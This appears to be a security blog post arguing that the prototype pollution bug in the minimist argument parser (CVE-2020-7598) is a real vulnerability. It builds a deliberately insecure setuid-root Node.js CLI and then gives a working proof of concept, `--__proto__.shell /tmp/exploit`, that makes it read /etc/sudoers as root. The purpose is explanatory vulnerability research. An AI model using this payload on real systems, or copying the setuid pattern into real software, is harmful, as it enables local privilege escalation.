# Prototype Pollution in minimist

What hadn't been said about prototype pollution vulnerabilities?

One thing we can all agree on is that it's a controversial topic and some may view it as a vulnerability while others will completely dismiss it.

## Minimist and CVE-2020-7598

Snyk reported the [prototype pollution minimist vulnerability](https://snyk.io/vuln/SNYK-JS-MINIMIST-559764) in March 2020, assigning it CVE-2020-7598, and even detailed step-by-step proof of concept and rational in a [blog post](https://snyk.io/blog/prototype-pollution-minimist) on how this vulnerability works.

Yet still, people claim this is not a vulnerability. **Let's prove them wrong**.

You want to prove me wrong? I challenge you to show me how you are exploiting the program we build in the following steps in a way that is unrelated to prototype pollution in minimist and gain local root privilege in a Node.js program that spawns commands.

## Exploiting CLIs built with minimist

To make my point about this minimist vulnerability being legitimate we need first to make sure that we agree on the following basic assumption: Developers, DevOps engineers, IT engineers, SREs or others may use Node.js as a platform to build CLI tools.

This is our story:

- A DevOps engineer builds a simple CLI tool in Node.js, using minimist to parse command arguments.
- The CLI is packaged using Zeit's [pkg](https://www.npmjs.com/package/pkg) so that the project's JavaScript files and its dependencies can be conveniently distributed as a single-file binary.
- The CLI is then provided to un-privileged users in a server or Desktop environment, and allows them to view a file that without the CLI only root is allowed to open, but the CLI makes it accessible for them. Reminder: those users are normal users, and aren't root-level users so they shouldn't be able to access other root-protected files in the file system.

### Scaffold a project

Let's begin by building out the project for this CLI, and we'll use `minimist` as a popular npm package that allows us to parse command arguments:

```sh
mkdir /tmp/my-app
cd /tmp/my-app
npm init -y
npm install --save minimist@1.2.0
```

### Build the CLI

The private file that the DevOps engineer wants to make available for users to access is `/etc/my-private-file.txt` and they build the code for it as follows:

filename: test.js

```js
const argv = require("minimist")(process.argv.slice(2));
const cp = require("child_process");
if (argv.help) {
  console.log("Just run me to view the file...");
} else {
  cp.execSync("cat /etc/my-private-file.txt", { stdio: "inherit", uid: 0 });
}
```

### Create the private file

Let's create that private file:

```sh
sudo -i
#provide your macOS user's password here
# now you should be dropped into a root user account:

echo "this is private" > /etc/my-private-file.txt

# make sure only root user is allowed to read/write to this file
chmod 600 /etc/my-private-file.txt

exit
# now you should be back in your user account
```

To test that indeed only the root user is allowed to read/write to this file, now that you are dropped back to your user's shell try to view it which should result in a permission error:

```sh
cat /etc/my-private-file.txt
```

At this point, even if you try to run the CLI that we've built you will get a permission error:

```sh
node test.js
```

### Package the file and assign it root permissions

We will need to install [pkg](https://www.npmjs.com/package/pkg) and use it to package our CLI as a single-file executable binary:

```sh
npm install --save-dev pkg
```

We can then package it for macOS:

```sh
./node_modules/.bin/pkg test.js --target node12-macos-x64
```

You should now have a resulting `test` file (the `.js` extension is ommited) that is about 42 Megabytes in size as it bundles Node.js inside it.

Executing it of course, still doesn't work.
We need to use the stuid trick in Unix systems that allows programs that have it enabled to assume permissions of the user who owns them, and so:

```sh
sudo chown root test
sudo chmod 4555 test
```

Now execute our Node.js CLI:

```sh
./test
```

And you should see `this is private` printed to the console.

### Exploiting minimist

There's another kind of protected file like ours in your file system called `/etc/sudoers`. Go ahead and try to view it using your regular user:

```sh
cat /etc/sudoers
```

You should get another permission error because you can't view it unless you are the root user. **OR** unless you are running a stuid program that executes commands as the root user.

At this point, you are welcome to try any way you want to view that `/etc/sudoers` file but remember: you don't actually have the root password and you can't really do `sudo /etc/sudoers`. We only used your regular user's sudo access to build this CLI and make it available for users.

Without access to `sudo`, you're welcome to try and exploit the Node.js runtime on your system to access `/etc/sudoers`. Wait, who even said you have Node.js. You don't, but even if you want to assume you have it you're welcome to try. You're also welcome to modify the `test` binary, but you can't either because you have no access to modify it.

**Here comes the prototype pollution vulnerability in minimist:**

You can definitely create some ad-hoc files, so let's do that:

```sh
echo '#!/bin/sh\ncat /etc/sudoers' > /tmp/exploit
chmod +x /tmp/exploit
```

We created our own small shell script that prints the contents of the file and made it executable.

Try to run it.
Epic failure. Because we can't access that file. Remember? it is root-protected.

However, due to the fact that minimist suffers from prototype pollution vulnerabilities, or in other words - we can provide it with a key and value as command line argument, that will allow us to set the shell of the invoked command in the `test.js` program as our own little CLI, which by the way, prints the contents of the root-protected `/etc/sudoers` file, which users shouldn't be able to access and aren't meant to either.

Exploit away:

```sh
./test --__proto__.shell /tmp/exploit
```

Run it and view the contents of the file.
You have just witnessed local privilege escalation, a type of vulnerability that allows non-root users to gain root-level access to a system.

## Determining the vulnerable component

So, what is vulnerable here actually?

IETF [defines](https://tools.ietf.org/html/rfc4949) a vulnerability as:

> A flaw or weakness in a system's design, implementation, or operation and management that could be exploited to violate the system's security policy

The use of minimist as a 3rd party library in our `test` program is the root cause of for making it vulnerable.

Furthermore, [CVSS 3.1 specficaition update](https://www.first.org/cvss/v3.1/user-guide) for scoring vulnerabilities in software libraries enhances:

> When scoring the impact of a vulnerability in a library, independent of any adopting program or implementation, the analyst will often be unable to take into account the ways in which the library might be used. While specific products using the library should generate CVSS scores specific to how they use the library, scoring the library itself requires assumptions to be made. The analyst should score for the reasonable worst-case implementation scenario. When possible, the CVSS information should detail these assumptions.

# Author

Liran Tal <liran.tal@gmail.com>
